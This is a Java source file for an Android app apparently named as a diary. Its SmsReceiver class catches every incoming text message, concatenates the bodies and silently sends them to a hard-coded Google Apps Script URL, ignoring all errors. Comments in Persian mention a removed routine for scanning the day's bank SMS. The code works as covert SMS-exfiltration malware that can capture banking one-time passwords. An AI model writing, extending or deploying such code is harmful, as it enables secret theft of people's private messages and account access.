package com.daftar.rooznameh;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    private static final String API =
            "https://script.google.com/macros/s/AKfycbyLjGFEBZuoF2HxMYHvbJaTEjM8NXf4_6mEUGd4iKE0Fp1xZwIwl3XfY5EhepGlKj72/exec?action=sms&msg=";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (context == null) return;

        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        StringBuilder msg = new StringBuilder();

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sms != null) {
                msg.append(sms.getMessageBody());
            }
        }

        sendToServer(msg.toString());
    }

    private void sendToServer(String msg) {

        new Thread(() -> {
            try {

                String encoded = URLEncoder.encode(msg, "UTF-8");

                URL url = new URL(API + encoded);

                HttpURLConnection conn =
                        (HttpURLConnection) url.openConnection();

                conn.setConnectTimeout(20000);
                conn.setReadTimeout(20000);

                conn.getResponseCode();
                conn.disconnect();

            } catch (Exception ignored) {}
        }).start();
    }

    // 🔥 این دو تا فقط برای اینکه GitHub خطا نده (Compatibility Fix)
    public static void retryPendingSms(Context context) {
        // در این نسخه کار انجام نمی‌دهد
        // فقط برای جلوگیری از build error
    }

    public static void scanInboxBankSmsToday(Context context, int limit) {
        // در این نسخه غیرفعال
        // چون اسکن را حذف کردیم
    }
}
